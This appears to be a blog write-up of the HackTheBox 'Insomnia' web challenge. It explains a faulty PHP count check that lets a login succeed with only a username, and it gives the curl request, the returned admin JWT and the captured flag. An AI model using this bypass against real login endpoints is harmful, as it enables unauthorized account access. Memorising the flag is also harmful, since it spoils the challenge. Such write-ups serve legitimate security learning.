---
title: "[HTB] Insomnia Writeup \U0001F4A4"
cover: >-
    https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/help-you-at-solving-hackthebox-htb-challenges-machines.png
categories:
    - [HackTheBox]
    - [CTF]
tags:
    - HTB
    - Web
    - HackTheBox
abbrlink: cab519b8
date: 2024-07-16 17:49:39
---

# 0x00 Challeng Info

It's a web challenge, so it gives us a website and the source code for us to analyze. Let's see the description first.

> Welcome back to Insomnia Factory, where you might have to work under the enchanting glow of the moon, crafting dreams and weaving sleepless tales.

Well, although it's not helpful, it's still a romantic setting for this challenge (you know, programmers & hackers always work at night).

# 0x01 Reconnaissance

Since it gave us the source code, we should check it out first. The most important thing is under the **controller directory** (`Insomnia/web_insomnia/Insomnia/app/Controllers`), because it's where the backend interact with users.

I check out the `ProfileController.php`, and find something interesting.

```php
if ($username == "administrator") {
    return view("ProfilePage", [
        "username" => $username,
        "content" => $flag,
    ]);
} else {
    $content = "Haven't seen you for a while";
    return view("ProfilePage", [
        "username" => $username,
        "content" => $content,
    ]);
}
```

So if we can login as **administrator**, then we can get the flag. Now the question is how we are able to do that. To know how, we should then find the answer in the login function, which is in `UserController.php`.

After analyzing the code, we can found that there's an logic error in the code that the developer doesn't notice it. In the `login()` function, the developer use `if (!count($json_data) == 2)` to check if the login data we passed has 2 arguments. But if we think it carefully, we can know that it's different to `if (count($json_data) !== 2)`. Here's are the differences.

1. `if (!count($json_data) == 2)`
    - First, it calculate `count($json_data)`, and it's an INT.
    - Then, the "!" negates the result we get. So if `count($json_data)` does not equals to 0, the expression will get a **false**. Anyways, it will get a **BOOL** as it's data type.
    - Finally, it checks whether the **BOOL** is equivalent to an **INT**, so the expression will always be a **false**, in other words, **the program will never go into this if statement**.
2. `if (count($json_data) !== 2)`
    - It calculate the `count($json_data)` and properly compare the number with 2.
    - So this is the correct way to check if the data count is legal.

The next thing you should know is everytime we sign in, the system will give us a token to verify our identitys. The following is the complete code of `ProfileController.php`

```php
<?php

namespace App\Controllers;

use App\Controllers\BaseController;
use CodeIgniter\HTTP\ResponseInterface;
use Config\Paths;
use Firebase\JWT\JWT;
use Firebase\JWT\Key;

class ProfileController extends BaseController
{
    public function index()
    {
        $token = (string) $_COOKIE["token"] ?? null;
        $flag = file_get_contents(APPPATH . "/../flag.txt");
        if (isset($token)) {
            $key = (string) getenv("JWT_SECRET");
            $jwt_decode = JWT::decode($token, new Key($key, "HS256"));
            $username = $jwt_decode->username;
            if ($username == "administrator") {
                return view("ProfilePage", [
                    "username" => $username,
                    "content" => $flag,
                ]);
            } else {
                $content = "Haven't seen you for a while";
                return view("ProfilePage", [
                    "username" => $username,
                    "content" => $content,
                ]);
            }
        }
    }
}
```

So the final step is to sign in as administrator and copy the token we get. Let's hack the planet!

# 0x02 Exploit

To sign in, I tried to use the browser to send the request first. But it won't work since the key "password" is still assigned a value of null string just like below. That way, we can't sign in due to the wrong password.

![Password is assigned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240716214725811.png)

To bypass this, I use **curl** to help me to send the request. The payload is the URL and the data, which is the username.

```bash
curl http://94.237.51.8:32663/index.php/login --data-raw '{"username": "administrator"}'
```

And the terminal will shows the response, then we can copy the token just like this.

```bash
{"message":"Login Succesful","token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MjExMjMwODEsImV4cCI6MTcyMTE1OTA4MSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIn0.fMLAS55mm69_aqQWEhehVlspjCvpfHJzOp4vy91Zjv8"}
```

The final step is going to `/index.php/profile` and paste the token we just got (by using the devtool to modify the token cookie). After refreshing the page, we can get the flag!

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240716215517124.png)

# 0x03 Pwned

```txt
HTB{I_just_want_to_sleep_a_little_bit!!!!!}
```
